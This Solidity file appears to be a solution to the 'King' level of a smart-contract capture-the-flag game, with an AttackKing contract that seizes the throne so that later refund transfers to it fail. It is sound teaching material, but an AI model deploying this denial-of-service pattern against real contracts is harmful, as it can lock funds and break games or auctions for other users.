// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title King
/// @author openZeppelin
/// @notice Break the king game
///         1. If the receiving contract does not have a fallback function then it cannot receive ether, which will throw an error.
///         2. A receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.
///         3. The receiving contract has a malicious payable function that consumes a large amount of gas, which fails the transaction or over consumes the gas.

/// can check out these links for real hacks/bugs
/// - https://www.kingoftheether.com/thrones/kingoftheether/index.html (king of the ether)
/// - http://www.kingoftheether.com/postmortem.html (king of the ether postmortem)

// contract King {

//   address payable king;
//   uint public prize;
//   address payable public owner;

//   constructor() payable {
//     owner = payable(msg.sender);  
//     king = payable(msg.sender);
//     prize = msg.value;
//   }

//   receive() external payable {
//     require(msg.value >= prize || msg.sender == owner);
//     king.transfer(msg.value);
//     king = payable(msg.sender);
//     prize = msg.value;
//   }

//   function _king() public view returns (address payable) {
//     return king;
//   }
// }

contract AttackKing {
  address public king;

  constructor(address _king) payable {
    king = address(_king);
  }

  function attack() public {
    payable(address(king)).call{value: 1100000000000000, gas: 1000000}("");
  }
}